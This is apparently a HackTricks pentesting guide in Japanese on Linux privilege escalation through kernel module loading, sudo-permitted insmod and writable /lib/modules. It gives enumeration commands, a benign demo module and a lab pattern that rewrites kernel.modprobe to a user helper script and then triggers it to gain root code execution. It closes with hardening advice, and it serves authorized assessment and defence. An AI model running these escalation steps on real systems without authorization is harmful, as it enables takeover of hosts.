# Kernel Modules and modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module と module-loading の misconfigurations

Kernel module support は、Linux privilege escalation review における影響の大きい領域です。unsigned-module に関するメッセージを、それだけで exploitable だと判断しないでください。ただし、次の実践的な質問への回答に利用できます。

- 現在の user は、`sudo`、capabilities、または writable な helper path を通じて modules を load できるか？
- module loading はまだ有効か？
- module signature enforcement は無効になっているか？
- module directories または module files は writable か？
- kernel logs を読んで何が起きたか確認できるか？

Quick triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
解釈:

- `modules_disabled=1` は、再起動するまで新しいモジュールをロードできないことを意味します。
- `module_sig_enforce=1` は通常、署名されていないモジュールをブロックします。
- `dmesg_restrict=0` は、多くのシステムで権限のないユーザーが kernel logs を読み取れるようにします。
- `/lib/modules/$(uname -r)/` 配下の書き込み可能なパスは危険です。モジュールの検出と auto-loading がそのツリーを信頼する可能性があるためです。

### モジュールのロードと kernel output の読み取り

ローカルモジュールをロードする正当な権限がある場合、`insmod` は指定した正確な `.ko` ファイルを挿入します。モジュールの init function は直ちに実行され、`printk()` で書き込まれたメッセージは kernel logs に表示されます。

review または lab environments 向けの最小限の workflow:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
`sudo -l`で`insmod`、`modprobe`、またはそれらをラップするwrapperが許可されている場合は、重大な問題として扱います。
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo で許可された `insmod`

ユーザーに `insmod` の実行を許可する sudo rule は、通常の管理用 helper の実行を許可する場合とは比較できません。モジュールの initialization code は `.ko` が挿入されるとすぐに kernel context で実行されるため、実際の review で問うべきことは、「このユーザーはロードされるモジュールを選択または変更できるか」です。

Generic review flow:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
ユーザーが任意の `.ko` を提供できる場合、authorized assessment では、そのルールをシステム全体の侵害として扱うべきです。より安全な運用パターンは、sudo を介したモジュールのロードを委任しないことです。避けられない場合は、正確なパス、所有者、権限、署名ポリシー、削除ワークフローを制限してください。

管理された lab で無害なモジュールをビルドするパターンの場合、最小限のソースと Makefile は次のようになります。
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
認可されたラボでのみビルドおよびロードしてください:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` の悪用チェック

`kernel.modprobe` は、module-loading の支援が必要になったときに kernel が呼び出す userspace helper を制御します。攻撃者がこれを writable な executable path に変更し、unknown binary format や別の module request path を trigger できる場合、root code execution につながる可能性があります。

現在の helper を確認します：
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
影響を与えられるか確認します:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
一般的なラボ内限定パターン:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
強化されたシステムでは、権限のないユーザーは `kernel.modprobe` に書き込めず、helper path に書き込み権限がないか、module-loading paths がブロックされるため、これは失敗するはずです。

### 書き込み可能な `/lib/modules` の確認

書き込み可能な module directories は、`modprobe` が後でどのように呼び出されるかによって、module replacement、malicious module planting、または auto-load abuse を可能にする場合があります。

書き込み可能な locations を確認します。
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
書き込み可能なモジュールの内容を見つけた場合は、モジュールがどのように検出されるかを確認します。
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
防御に関する注意事項：

- `/lib/modules` は `root:root` が所有し、ユーザーが書き込みできないようにする。
- 運用上可能な場合は、起動後に `kernel.modules_disabled=1` を設定する。
- loadable modules が必要なシステムでは、module signing を強制する。
- `/proc/sys/kernel/modprobe` および `/lib/modules` への書き込みと、予期しない `insmod`/`modprobe` の実行を監視する。

{{#include ../../banners/hacktricks-training.md}}
